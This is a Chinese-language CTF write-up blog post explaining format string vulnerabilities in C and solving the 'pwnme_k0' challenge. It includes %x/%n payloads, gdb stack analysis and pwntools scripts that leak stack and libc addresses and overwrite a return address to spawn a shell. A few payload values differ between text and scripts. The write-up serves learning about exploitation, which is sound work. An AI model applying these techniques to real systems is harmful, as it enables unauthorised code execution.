<!doctype html>



  



    
  

<html class="theme-next logos use-motion" lang="zh-hk">
<head><meta name="generator" content="Hexo 3.8.0">
  <meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">



<meta http-equiv="Cache-Control" content="no-transform">
<meta http-equiv="Cache-Control" content="no-siteapp">












  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">




  
  
  
  

  
    
    
  

  

  

  

  

  
    
    
    <link href="//fonts.useso.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
  






<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">

<link href="/css/main.css?v=5.1.0" rel="stylesheet" type="text/css">


  <meta name="keywords" content="Hexo, NexT">








  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=5.1.0">






<meta name="description" content="¶浅谈格式化字符串漏洞 ¶0x00 前言  本来这篇是想投稿到乌云知识库的，但是知识库收录了另一篇更加详尽的writeup三个白帽《来 PWN 我一下好吗 – 第二期》之pwn入门，仔细看过以后发现给出的两种解法的确十分有学习价值。 那就把自己的writeup放到这里，权当积累。  接触PWN有一段时间了，这次总算成功挑战了三个白帽上的题目。总的来说，这道题目不算很难，是很明显的格式化字符串漏洞。">
<meta property="og:type" content="article">
<meta property="og:title" content="三个白帽-来 PWN 我一下好吗第二期">
<meta property="og:url" content="http://matshao.com/2016/07/13/三个白帽-来-PWN-我一下好吗第二期/index.html">
<meta property="og:site_name" content="Mid Station">
<meta property="og:description" content="¶浅谈格式化字符串漏洞 ¶0x00 前言  本来这篇是想投稿到乌云知识库的，但是知识库收录了另一篇更加详尽的writeup三个白帽《来 PWN 我一下好吗 – 第二期》之pwn入门，仔细看过以后发现给出的两种解法的确十分有学习价值。 那就把自己的writeup放到这里，权当积累。  接触PWN有一段时间了，这次总算成功挑战了三个白帽上的题目。总的来说，这道题目不算很难，是很明显的格式化字符串漏洞。">
<meta property="og:locale" content="zh-hk">
<meta property="og:image" content="http://7j1yti.com1.z0.glb.clouddn.com/1467531632558.png">
<meta property="og:image" content="http://7j1yti.com1.z0.glb.clouddn.com/1467531867147.png">
<meta property="og:image" content="http://7j1yti.com1.z0.glb.clouddn.com/1467548796856.png">
<meta property="og:image" content="http://7j1yti.com1.z0.glb.clouddn.com/1467549680560.png">
<meta property="og:image" content="http://7j1yti.com1.z0.glb.clouddn.com/1467550720899.png">
<meta property="og:image" content="http://7j1yti.com1.z0.glb.clouddn.com/1467551283990.png">
<meta property="og:image" content="http://7j1yti.com1.z0.glb.clouddn.com/1467593479609.png">
<meta property="og:image" content="http://7j1yti.com1.z0.glb.clouddn.com/1467594774685.png">
<meta property="og:image" content="http://7j1yti.com1.z0.glb.clouddn.com/1467595349338.png">
<meta property="og:image" content="http://7j1yti.com1.z0.glb.clouddn.com/1467596189639.png">
<meta property="og:image" content="http://7j1yti.com1.z0.glb.clouddn.com/1467551283990.png">
<meta property="og:updated_time" content="2016-07-13T09:13:19.000Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="三个白帽-来 PWN 我一下好吗第二期">
<meta name="twitter:description" content="¶浅谈格式化字符串漏洞 ¶0x00 前言  本来这篇是想投稿到乌云知识库的，但是知识库收录了另一篇更加详尽的writeup三个白帽《来 PWN 我一下好吗 – 第二期》之pwn入门，仔细看过以后发现给出的两种解法的确十分有学习价值。 那就把自己的writeup放到这里，权当积累。  接触PWN有一段时间了，这次总算成功挑战了三个白帽上的题目。总的来说，这道题目不算很难，是很明显的格式化字符串漏洞。">
<meta name="twitter:image" content="http://7j1yti.com1.z0.glb.clouddn.com/1467531632558.png">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Logos',
    sidebar: {"position":"left","display":"post"},
    fancybox: true,
    motion: true,
    duoshuo: {
      userId: '0',
      author: '博主'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="http://matshao.com/2016/07/13/三个白帽-来-PWN-我一下好吗第二期/">





  <title> 三个白帽-来 PWN 我一下好吗第二期 | Mid Station </title>
</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="zh-hk">

  





<script>
  	var _mtac = {};
  	(function() {
  		var mta = document.createElement("script");
  		mta.src = "http://pingjs.qq.com/h5/stats.js?v2.0.4";
  		mta.setAttribute("name", "MTAH5");
  		mta.setAttribute("sid", "500688563");
  		var s = document.getElementsByTagName("script")[0];
  		s.parentNode.insertBefore(mta, s);
  	})();
</script>





  
  
    
  

  <div class="container one-collumn sidebar-position-left page-post-detail ">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
    <div class="header-logos"> 
      <div class="site-meta ">
  
    <div class="site-meta-headline">
      <a href="/">
        <img class="custom-logo-image" src="/images/logo_light.png" alt="Mid Station">
      </a>
    </div>
  

  <div class="custom-logo-site-title">
    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <span class="site-title">Mid Station</span>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>
    
      <p class="site-subtitle"></p>
    
</div>

<div class="site-nav-toggle">
  <button>
    <span class="btn-bar"></span>
    <span class="btn-bar"></span>
    <span class="btn-bar"></span>
  </button>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
            
            首頁
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
            
            歸檔
          </a>
        </li>
      
        
        <li class="menu-item menu-item-about">
          <a href="/about" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
            
            關於
          </a>
        </li>
      

      
    </ul>
  

  
</nav>



 
            
      </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            

  <div id="posts" class="posts-expand">
    

  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
  <link itemprop="mainEntityOfPage" href="http://matshao.com/2016/07/13/三个白帽-来-PWN-我一下好吗第二期/">

  <span style="display:none" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <meta itemprop="name" content="Matthew Shao">
    <meta itemprop="description" content>
    <meta itemprop="image" content="/images/avatar.gif">
  </span>

  <span style="display:none" itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
    <meta itemprop="name" content="Mid Station">
    <span style="display:none" itemprop="logo" itemscope itemtype="http://schema.org/ImageObject">
      <img style="display:none;" itemprop="url image" alt="Mid Station" src="/images/logo_light.png">
    </span>
  </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                三个白帽-来 PWN 我一下好吗第二期
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">發表於</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2016-07-13T16:59:05+08:00">
                2016-07-13
              </time>
            

            

            
          </span>

          

          
            
          

          

          
          

          

          

        </div>
      </header>
    


    <div class="post-body" itemprop="articleBody">

      
      

      
        <h2 id="浅谈格式化字符串漏洞"><a class="header-anchor" href="#浅谈格式化字符串漏洞">¶</a>浅谈格式化字符串漏洞</h2>
<h3 id="0x00-前言"><a class="header-anchor" href="#0x00-前言">¶</a>0x00 前言</h3>
<blockquote>
<p>本来这篇是想投稿到乌云知识库的，但是知识库收录了另一篇更加详尽的writeup<a href="http://drops.wooyun.org/papers/17441" target="_blank" rel="noopener">三个白帽《来 PWN 我一下好吗 – 第二期》之pwn入门</a>，仔细看过以后发现给出的两种解法的确十分有学习价值。<br>
那就把自己的writeup放到这里，权当积累。</p>
</blockquote>
<p>接触PWN有一段时间了，这次总算成功挑战了三个白帽上的题目。总的来说，这道题目不算很难，是很明显的格式化字符串漏洞。鉴于知识库上还没有专门讲解格式化字符串漏洞的文章，我就以此为契机，尝试借着题目把这类漏洞讲清楚。<br>
文章前几部分主要是对格式化字符串漏洞的介绍，还有多走的一些弯路，心急的看官可以直接跳到0x05 Try2看正确题解。</p>
<a id="more"></a>
<h3 id="0x01-where"><a class="header-anchor" href="#0x01-where">¶</a>0x01 Where</h3>
<p><a href="http://7j1yti.com1.z0.glb.clouddn.com/pwnme_k0" target="_blank" rel="noopener">pwnme_k0</a><br>
拿到PWN题目的可执行文件，我一般会从最直观的角度开始对它进行分析，也就是直接运行，观察程序的结构。<br>
<img src="http://7j1yti.com1.z0.glb.clouddn.com/1467531632558.png" alt="Alt text"><span class="image-caption">Alt text</span><br>
程序很简单，就是要求输入用户名和密码注册，之后会有三个选项，选择第一个的话会打印出用户名和密码。既然涉及到字符串的输出，这里就可以尝试一下用一些特殊的字符串看存不存在格式化字符串的漏洞。<br>
<img src="http://7j1yti.com1.z0.glb.clouddn.com/1467531867147.png" alt="Alt text"><span class="image-caption">Alt text</span><br>
如图，当我们把用户名密码都设为<code>%x.%x.%x.%x</code>，请求输出时会泄露出一些16进制的内容，也就是存在栈上的一些内存信息。所以可以确定程序存在格式化字符串漏洞。</p>
<p>接着我们可以把程序放到IDA中用F5反汇编一下，可以观察到位于<code>0x400B07</code>这个函数是问题的所在。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __usercall sub_400B07@&lt;eax&gt;(<span class="keyword">char</span> format@&lt;dil&gt;, <span class="keyword">char</span> formata, __int64 a3, <span class="keyword">char</span> a4)</span><br><span class="line">&#123;</span><br><span class="line">  write(<span class="number">0</span>, <span class="string">"Welc0me to sangebaimao!\n"</span>, <span class="number">0x1A</span>uLL);</span><br><span class="line">  <span class="built_in">printf</span>(&amp;formata, <span class="string">"Welc0me to sangebaimao!\n"</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(&amp;a4 + <span class="number">4</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>其中<code>printf(&amp;formata, &quot;Welc0me to sangebaimao!\n&quot;);</code> 和 <code>printf(&amp;a4 + 4)</code>这两条语句直接把用户控制的字符串作为<code>printf</code>的第一个参数，导致了漏洞的产生。</p>
<h3 id="0x02-why"><a class="header-anchor" href="#0x02-why">¶</a>0x02 Why</h3>
<p>学过C语言的同学都知道，格式化字符串在我们使用<code>printf</code>函数输出时起着很大的作用，它为输出合适的字符串提供了灵活易用的控制机制。但是对<code>printf</code>类函数不严谨的调用往往会酿成大错。思考以下两段代码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> buf[<span class="number">100</span>];</span><br><span class="line">fgets(buf, <span class="number">100</span>, <span class="built_in">stdin</span>);</span><br><span class="line"><span class="built_in">printf</span>(buf);</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> buf[<span class="number">100</span>];</span><br><span class="line">fgets(buf, <span class="number">100</span>, <span class="built_in">stdin</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%s"</span>, buf);</span><br></pre></td></tr></table></figure>
<p>两段代码都是直接获取用户输入的字符串然后直接输出，其实在函数调用的层面上却是大不一样的。如果我们输入正常字符串<code>HELLO WORLD</code>，两段代码的输出当然不会有任何差别，但是如果我们输入格式化字符串，比如<code>%x.%x.%x.%x</code>，第一段代码就会输出形如<code>4010c3.1a.b71cf710.b74a3060</code>的内存信息，而第二段代码则只会原原本本地输出<code>%x.%x.%x.%x</code>。</p>
<p>造成这种差异的原因是C语言的函数调用的机制。当我们调用一个函数时，参数是存放在栈上的（64位前几个参数会存放在寄存器），而程序本身并没有明确地指明参数的边界。当调用像<code>printf</code>这类函数的时候，参数的个数其实是通过第一个参数（格式化字符串）来确定的。<br>
系统执行<code>printf（&quot;%s&quot;, buf)</code>时，首先从第一个参数<code>%s</code>知道了要读取下一个参数，并以字符串的格式输出。<br>
但是系统执行<code>printf(buf)</code>时，由于我们是可以控制<code>buf</code>的内容的，如果输入<code>%x.%x.%x.%x</code>，系统就会误认为接下来会有4个参数，接着从栈/寄存器上获取内容并按照指定格式输出，导致内存信息的泄露。</p>
<h2 id="0x03-how"><a class="header-anchor" href="#0x03-how">¶</a>0x03 How</h2>
<p>以上就是格式化字符串漏洞形成的原因，接下来介绍一下基本的利用方法。</p>
<h4 id="读："><a class="header-anchor" href="#读：">¶</a>读：“$”</h4>
<p>我们可以一直延长像<code>%x.%x.%x.%x</code>这样的字符串，直到程序输出在栈上我们想要的信息，但是有时程序会对输入字符串的长度进行限制（本题就进行了十分严格的限制），有什么办法能使我们读得更多更远呢？<br>
答案就是运用<strong>直接访问参数</strong>的方法：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">语法：<span class="built_in">printf</span>(<span class="string">"%&lt;arg#$&lt;format&gt;"</span>);</span><br><span class="line">例子：<span class="built_in">printf</span>(<span class="string">"%3$d"</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>); -&gt; <span class="number">3</span></span><br></pre></td></tr></table></figure>
<p>以上例子可以直接输出第三个参数的内容，同理，如果我们输入<code>printf(&quot;%100$x&quot;)</code>,程序就会以16进制输出栈上偏移位置为100的内存所存放的内容，通过更改偏移的位置，我们就可以获取栈上的大量信息。</p>
<h4 id="写：-n"><a class="header-anchor" href="#写：-n">¶</a>写：“%n”</h4>
<p><code>%n</code>是个神奇的格式符，首先它会接受一个指针，然后会把<strong>当前打印的字节数</strong>写进指针指向的地址。虽然比较绕，但这是利用格式化字符串控制eip的唯一方法。请看下面的例子：<br>
假如栈上偏移位置为15的内存存放了<code>0xdeadbeef</code>这个地址，通过<code>printf(&quot;aaaa%15$n&quot;)</code>这个语句，可以往<code>0xdeadbeef</code>里面写入<code>0x4</code>，因为在<code>%n</code>之前总共打印了<strong>4</strong>个字节的a。为了控制写入的内容，我们可以灵活使用<code>%x</code>格式符，通过<code>%</code>和<code>x</code>之间的数字可以控制打印内容的长度，比如<code>%2730x%15$n</code>就会在<code>%n</code>之前打印总长度为2730的内容，那么写入的内容就会变成<code>0xaaa</code>（16进制的2730）。<br>
那么如果栈上没有我们想写的地址呢？那也好办，因为字符串本身也是放在栈上的，只要我们知道字符串本身的偏移位置就能构造出想要的payload。<br>
假如我们确定了字符串本身在栈上的偏移位置是8，<code>\xef\xbe\xad\xde%8$n</code>（注意小端写法）这个payload就会往<code>0xdeadbead</code>这个地址写入<code>0x4</code>的数据。要是我们同样想写入<code>0xaaa</code>的数据，首先要用<code>0xaaa</code>（想写入的数据）-<code>0x4</code>（已有长度，这里就是地址的长度）=<code>0xaa6</code>（转换为十进制是2726）。最终得出的payload是<code>\xef\xbe\xad\xde%2726%8$n</code>。<br>
用<code>%n</code>写地址的基本思路就是这样了，当然在实战中<code>%n</code>也有很多缺点，比如一次就会写入一个双字，而写入的内容大都不像<code>0xaaa</code>这样简短，这就需要打印很长的一段内容，导致需要等待很长的时间。所以我们要灵活运用<code>$hn</code>,<code>$hhn</code>等兄弟格式符来写入一个字，一个字节的内容，这点会在等下的实际运用中展开说明。</p>
<h2 id="0x04-try1"><a class="header-anchor" href="#0x04-try1">¶</a>0x04 Try1</h2>
<p>介绍完格式化字符串的来龙去脉，接下来就可以进入对本次<code>pwnme_k0</code>程序的题解了。<br>
首先，养成好习惯，先确定程序开了哪些防护机制：<br>
<img src="http://7j1yti.com1.z0.glb.clouddn.com/1467548796856.png" alt="Alt text"><span class="image-caption">Alt text</span><br>
NX不用说基本是现在PWN题目的必备，然后没开PIE算是利好消息，这里RELRO是FULL说明就不能通过重写GOT(Global Offset Table)和DTOR(Destructor List)的方法来控制eip了，如果是Partial和Disable则可以利用。对于格式化字符串漏洞来说，这两种方法往往是最直接高效的，这就意味着，这题只能通过重写返回地址或函数指针的方式来控制eip了。<br>
根据之前的介绍，我们已经确定了程序的漏洞和利用位置，接下来就是如何利用的问题。<br>
对于利用格式化字符串漏洞，第一步是要确定字符串的偏移位置，这对接下来payload的构建是至关重要的。<br>
<img src="http://7j1yti.com1.z0.glb.clouddn.com/1467549680560.png" alt="Alt text"><span class="image-caption">Alt text</span><br>
通过几次测试就能确定到字符串的偏移位置为8，如图<code>%8$x</code>所对应的位置输出是<code>61616161</code>也就是字符串开头aaaa的16进制形式。</p>
<p>既然要往栈上写东西，那么栈的地址总要知道的吧？下一步就是获取栈上的任一地址，再通过偏移地址的计算找到我们要写东西的地址。我们用gdb调试程序，在<code>0x400b28</code>也就是第一次调用<code>printf</code>的地方下一个断点，运行程序，输入用户名aaaa密码bbbb，再输入选项1打印信息。在断点处查看栈的信息：<br>
<img src="http://7j1yti.com1.z0.glb.clouddn.com/1467550720899.png" alt="Alt text"><span class="image-caption">Alt text</span><br>
根据之前的分析，开头会位于第8个偏移位置，那么照这样数下去，第一个保存栈上地址的位置是14，这里显示的是<code>0x7fffffffddf0</code>（不同机器上可能会不同）。<br>
<img src="http://7j1yti.com1.z0.glb.clouddn.com/1467551283990.png" alt="Alt text"><span class="image-caption">Alt text</span><br>
然后我们<code>bt</code>查看函数调用栈，并且一直next直到第一个<code>ret</code>命令，可以看到第一个返回地址位于<code>0x7fffffffdd08</code>, <code>0x7fffffffddf0</code> - <code>0x7fffffffdd08</code> = <code>0xe8</code>，通过这个偏移值，我们就能计算出返回地址在栈上的地址，然后用之前介绍到的方法写入我们想要返回的地址从而达到控制eip的目的。简单用<code>pwntools</code>写了一小段脚本：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">'./pwnme_k0'</span>)</span><br><span class="line">p.sendline(<span class="string">"%14$lx"</span>) <span class="comment"># 因为是64位程序，lx用于输出四字节</span></span><br><span class="line">p.sendline(<span class="string">"JUNK"</span>)</span><br><span class="line">p.sendline(<span class="string">"1"</span>)</span><br><span class="line">p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">stack_leak = p.recv(<span class="number">12</span>)</span><br><span class="line">stack_leak = int(stack_leak, <span class="number">16</span>)</span><br><span class="line">stack_ret = stack_leak - <span class="number">0xe8</span></span><br><span class="line">log.info(<span class="string">"stack_leak: %x"</span> % stack_leak)</span><br><span class="line">log.info(<span class="string">"stack_ret: %x"</span> % stack_ret)</span><br></pre></td></tr></table></figure>
<p>写入的位置解决了，接下来就该考虑写什么的问题了。我们控制eip的最终目的就是调用<code>system(&quot;/bin/sh&quot;)</code>来获得一个shell，所幸的是，这题里面<code>system</code>和<code>&quot;/bin/sh&quot;</code>这两个元素已经包含在程序里面，通过peda的<code>find</code>语句配合IDA，很快就找到了<code>system</code>的地址为<code>0x400768</code>,<code>&quot;/bin/sh&quot;</code>的地址为<code>0x400f38</code>。由于是64位的程序，要调用<code>system(&quot;/bin/sh&quot;)</code>要分两步走：</p>
<ol>
<li>把<code>&quot;/bin/sh&quot;</code>的地址放到rdi寄存器中(64位程序调用函数是第一个参数会放到rdi寄存器中)</li>
<li>把<code>system</code>地址放到ret语句执行时的栈顶，也就是我们先前计算得到的地址</li>
</ol>
<p>那么思路就变得清晰了，现在总共有两种方法：</p>
<ol>
<li>先把<code>/bin/sh</code>的地址放到栈上，再利用gadget把地址pop到rdi寄存器中，然后ret到<code>system</code>的地址。</li>
<li>获取ret执行时rdi存放的地址，直接放这个地址里面写入<code>/bin/sh</code>（或者<code>sh</code>也行）</li>
</ol>
<p>我们先来尝试第一种方法，首先观察第一次ret时候栈上的分布是怎样的。程序的用户名和密码都有上限为20的长度限制，于是我们通过把用户名密码都设为<code>1234567890abcdef123\n</code>便于观察栈的分布。<br>
<img src="http://7j1yti.com1.z0.glb.clouddn.com/1467593479609.png" alt="Alt text"><span class="image-caption">Alt text</span></p>
<figure class="highlight brainfuck"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">      <span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="comment">8</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span> <span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="comment">9</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span> <span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="comment">10</span></span><br><span class="line"><span class="comment">user:</span> <span class="comment">|</span> <span class="comment">12345678</span> <span class="comment">|</span> <span class="comment">90abcdef</span> <span class="comment">|</span> <span class="comment">123\n</span></span><br><span class="line"><span class="comment"></span>      <span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span> <span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="comment">11</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span> <span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="comment">12</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span></span><br><span class="line"><span class="comment">pass:</span> <span class="comment">1234</span> <span class="comment">|</span> <span class="comment">567890ab</span> <span class="comment">|</span> <span class="comment">cdef123\n</span> <span class="comment">|</span></span><br></pre></td></tr></table></figure>
<p>输入内容的位置和偏移位置的对应关系如上图所示，我们要往<code>0x7fffffffdd08</code>里面写入<code>0x400768</code>(<code>system</code>地址)，就可以构造出这样的payload：<br>
user:<code>%4196120x%11$n</code><br>
pass:<code>JUNK\x08\xdd\xff\xff\xff\x7f</code><br>
给出相应的脚本代码：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">p.sendline(<span class="string">"2"</span>)</span><br><span class="line">   p.sendline(<span class="string">"%4196200x%11$n"</span>)</span><br><span class="line">   p.sendline(<span class="string">'JUNK'</span> + p64(stack_ret))</span><br></pre></td></tr></table></figure>
<blockquote>
<p>小提示：编写脚本时想要用gdb调试程序，可以在相应位置加入<code>gdb.attach(p)</code>语句，pwntools为自动为我们连接到gdb进行调试。</p>
</blockquote>
<p>执行到第一个ret<code>0x400b40</code>的位置，栈的分布和寄存器如图：<br>
<img src="http://7j1yti.com1.z0.glb.clouddn.com/1467594774685.png" alt="Alt text"><span class="image-caption">Alt text</span><br>
可以看到，栈顶已经被成功写入<code>system</code>的地址，只要继续运行就能调用到<code>system</code>函数。如果我们按照上面的第一条思路，接下来就要找合适的gadget。<br>
<img src="http://7j1yti.com1.z0.glb.clouddn.com/1467595349338.png" alt="Alt text"><span class="image-caption">Alt text</span><br>
包含<code>pop rdi</code>的gadget就只有这两条，它们都是把当前栈顶的内容pop进rdi里面。这就要求我们在8号位放进<code>/bin/sh</code>的地址，照这思路我选取第二条gadget构造了一条看似可行的payload：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">system = <span class="number">0x400768</span></span><br><span class="line">binsh = <span class="number">0x400f38</span></span><br><span class="line">   p.sendline(<span class="string">"2"</span>) </span><br><span class="line">   p.send(p64(bin_sh) + <span class="string">"%4196524x%12"</span>) <span class="comment">#pop rdi;pop rsi;pop rdx;ret</span></span><br><span class="line">   p.send(<span class="string">'$nNK'</span> + p64(system)+p64(stack_ret))</span><br></pre></td></tr></table></figure>
<p>这看起来很不错，首先能把<code>/bin/sh</code>的地址放进rdi，又能在下一个ret的位置放进<code>system</code>的地址。但实际上却是不能用的，原因就是用户名的字符串是通过<code>strcpy</code>来复制到栈上的，我们输入<code>/bin/sh</code>的地址时，必须会输入<code>0x00</code>来填充空位，而<code>strcpy</code>一遇到<code>0x00</code>空字符就会产生截断，导致后续的内容无法放到栈上。<br>
<img src="http://7j1yti.com1.z0.glb.clouddn.com/1467596189639.png" alt="Alt text"><span class="image-caption">Alt text</span></p>
<p>那么就只能转向第二条思路，观察在断点处rdi存放的地址，是一个libc段附近的地址，猜测应该是输出缓冲区的地址，在各种位置输入尝试改变其内容为<code>sh</code>均无果。最后通过泄露libc段地址并计算出偏移地址，在一大段<code>0x20</code>后写入<code>sh</code>，Exp在本机终于得以成功执行。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">system = <span class="number">0x400768</span></span><br><span class="line">binsh = <span class="number">0x400f38</span></span><br><span class="line">pop_rdi = <span class="number">0x400f13</span></span><br><span class="line">ppp = <span class="number">0x400f13</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">'./pwnme_k0'</span>)</span><br><span class="line"><span class="comment">#p = remote('123.59.56.23','44110')</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span><span class="params">(address)</span>:</span></span><br><span class="line">    p.sendline(<span class="string">"%14$lx"</span>)</span><br><span class="line">    p.sendline(<span class="string">"JUNK"</span>)</span><br><span class="line">    p.sendline(<span class="string">"1"</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">    stack_leak = p.recv(<span class="number">12</span>)</span><br><span class="line">    stack_leak = int(stack_leak, <span class="number">16</span>)</span><br><span class="line">    stack_ret = stack_leak - <span class="number">0xe8</span></span><br><span class="line">    log.info(<span class="string">"stack_leak: %x"</span> % stack_leak)</span><br><span class="line">    log.info(<span class="string">"stack_ret: %x"</span> % stack_ret)</span><br><span class="line"></span><br><span class="line">    p.sendline(<span class="string">"2"</span>)</span><br><span class="line">    p.sendline(<span class="string">"%37$lx"</span>)</span><br><span class="line">    p.sendline(<span class="string">"JUNK"</span>)</span><br><span class="line">    p.sendline(<span class="string">"1"</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">    libc_leak = p.recv(<span class="number">12</span>)</span><br><span class="line">    libc_leak = int(libc_leak, <span class="number">16</span>) </span><br><span class="line">    to_write = libc_leak + <span class="number">0x5c30bb</span> </span><br><span class="line">    libc_sh = libc_leak + <span class="number">0x15a97e</span></span><br><span class="line">    log.info(<span class="string">"libc_leak: %x"</span> % libc_leak)</span><br><span class="line">    log.info(<span class="string">"libc_sh: %x"</span> % libc_sh)</span><br><span class="line">    log.info(<span class="string">"to_write: %x"</span> % to_write)</span><br><span class="line"></span><br><span class="line">    p.sendline(<span class="string">"2"</span>)</span><br><span class="line">    p.send(<span class="string">"%26739x%11$n"</span>) <span class="comment">#写sh到一rdi指向的大段0x20之后</span></span><br><span class="line">    p.sendline(<span class="string">'junk'</span> + p64(to_write))</span><br><span class="line">    p.sendline(<span class="string">"1"</span>)</span><br><span class="line"></span><br><span class="line">    p.sendline(<span class="string">"2"</span>)</span><br><span class="line">    p.sendline(<span class="string">"%4196120x%11$n"</span>)</span><br><span class="line">    p.sendline(<span class="string">'junk'</span> + p64(stack_ret))<span class="comment">#gdb.attach(p)</span></span><br><span class="line">    p.sendline(<span class="string">"1"</span>)</span><br><span class="line"></span><br><span class="line">leak(<span class="number">0x400f38</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
